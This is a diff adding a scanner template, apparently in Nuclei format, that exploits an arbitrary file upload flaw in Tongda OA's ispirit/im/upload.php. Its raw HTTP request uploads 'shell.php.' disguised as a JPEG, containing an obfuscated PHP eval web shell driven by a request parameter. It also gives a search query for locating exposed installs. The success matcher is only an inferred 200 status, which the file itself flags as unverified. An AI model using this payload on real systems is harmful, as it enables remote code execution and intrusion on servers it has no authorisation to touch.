@@ -1,0 +1,72 @@
+id: poc-6f1ff68f8022ef78bad3
+info:
+  name: 通达OAispirit存在后台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6f1ff68f8022ef78bad35d9e5dc6e1e5
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 6f1ff68f8022ef78bad35d9e5dc6e1e5
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /ispirit/im/upload.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 639
+
+    Cache-Control: no-cache
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
+
+    Connection: close
+
+
+    ------WebKitFormBoundarypyfBh1YB4pV8McGB
+
+    Content-Disposition: form-data; name="UPLOAD_MODE"
+
+
+    1
+
+    ------WebKitFormBoundarypyfBh1YB4pV8McGB
+
+    Content-Disposition: form-data; name="P"
+
+
+    l2h5pe5n9hmhrmqi2nj89lae50
+
+    ------WebKitFormBoundarypyfBh1YB4pV8McGB
+
+    Content-Disposition: form-data; name="DEST_UID"
+
+
+    1
+
+    ------WebKitFormBoundarypyfBh1YB4pV8McGB
+
+    Content-Disposition: form-data; name="ATTACHMENT"; filename="shell.php."
+
+    Content-Type: image/jpeg
+
+
+    <?php class GB7W5S8T { public function __construct($H7U41){ @eval("/*Zc98EhVx4t*/".$H7U41."/*Zc98EhVx4t*/"); }}new GB7W5S8T($_REQUEST[''x'']);?>
+
+    ------WebKitFormBoundarypyfBh1YB4pV8McGB--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
